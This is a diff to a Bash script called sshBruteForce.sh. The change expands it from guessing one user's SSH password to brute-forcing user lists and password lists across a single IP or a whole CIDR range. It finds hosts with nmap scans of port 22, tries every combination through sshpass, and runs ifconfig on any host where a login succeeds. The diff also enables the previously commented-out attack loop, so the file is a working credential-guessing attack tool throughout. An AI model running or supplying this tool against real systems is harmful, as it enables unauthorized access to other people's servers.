@@ -2,18 +2,20 @@
 
 #     
 #     
-#     ./sshBruteForce.sh [user] [file]
+#     ./sshBruteForce.sh [user/user.lst] [passwords.lst] [ip/CIDR]
 #     
-#     Attempt to authenticate with [user] while iterating
-#     through all the passwords in [file]. Passwords in [file]
-#     should be delimted (IFS) with newlines
+#     Iterate through [user(s)], [passwords], & [IP(s)]
+#     Variables must be passed in that order.
+#     [user.lst] and [passwords.lst] must be delimited
+#     by new lines or carriage returns. A single IP or
+#     CIDR may be passed "${3}"
 #     
 #     
 
 
 ## Script Variables
 USER="${1}"
-LIST="${2}"
+PASSWORDS="${2}"
 IP="${3}"
 IP_REGEX='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)'
 CIDR_REGEX='(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])(\/([0-9]|[1-2][0-9]|3[0-2]))'
@@ -21,9 +23,13 @@ CIDR_REGEX='(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][
 user_check(){
 	local username
 	username="${1}"
+	declare -g USERS=()
 	if [[ $(ls ${username} 2> /dev/null) ]]; then
-		echo 'Usage: ./sshBruteForce.ssh user password.lst 192.168.1.1'
-		exit 26
+		echo 'Adding list of users to array'
+		declare -g USERS=( $(cat "${username}") )
+	else
+		echo 'Adding single user to array'
+		USERS+=("${username}")	
 	fi
 }
 
@@ -34,7 +40,7 @@ password_list_check(){
 	if [[ ${password_list_check:?"### Usage: ./sshBruteForce.ssh user password.lst 192.168.1.1"} ]]; then
 		IFS='
 		'
-		declare -g LIST=( $(cat "${password_list_check}") )
+		declare -g PASSWORDS=( $(cat "${password_list_check}") )
 	fi
 }
 
@@ -43,17 +49,18 @@ ip_check(){
 	ip="${1}"
 	declare -g IPS=()
 	if [[ "${ip}" =~ ${CIDR_REGEX} ]]; then
-		echo 'fire the nmap'
+		echo 'CIDR detected. Building Array'
 		declare -g IPS=( $(nmap -p T:22 "${ip}" | grep -B3 'tcp open' | grep -Eo "${IP_REGEX}") )
 	else
 		if ! [[ "${ip}" =~ ${IP_REGEX} ]]; then
 			echo "${ip} is not a valid IP or CIDR address"
 			exit 26
 		else
-			echo 'adding ip to array'
+			echo 'Individual IP detected'
 			IPS+=("${ip}")
 		fi
 	fi
+	echo ''
 }
 
 
@@ -68,23 +75,18 @@ dep_check(){
 
 
 sshpass_iterations(){
-	local username
-	username=${1}
-	local ip
-	ip="${2}"
-	for password in ${LIST[@]}; do
-		echo "Attempting Username: ${username} Password: ${password}" && sshpass -p "${password}" ssh "${username}"@"${ip}" 2>/dev/null <<<- 'ifconfig | grep -m1 "inet "'
+	for ip in ${IPS[@]}; do
+	  for user in ${USERS[@]}; do
+	    for password in ${PASSWORDS[@]}; do
+				echo "Attempting IP: ${ip} Username: ${user} Password: ${password}" && sshpass -p "${password}" ssh "${user}"@"${ip}" 2>/dev/null <<<- 'ifconfig | grep -m1 "inet "'
+	    done
+	  done
 	done
 }
 
 
 user_check "${USER}"
-password_list_check "${LIST}"
+password_list_check "${PASSWORDS}"
 ip_check "${IP}"
-
-for ip in ${IPS[@]}; do
-	echo "${ip}"
-done	
-
-#dep_check
-#sshpass_iterations "${USER}" "${IP}"
+dep_check
+sshpass_iterations
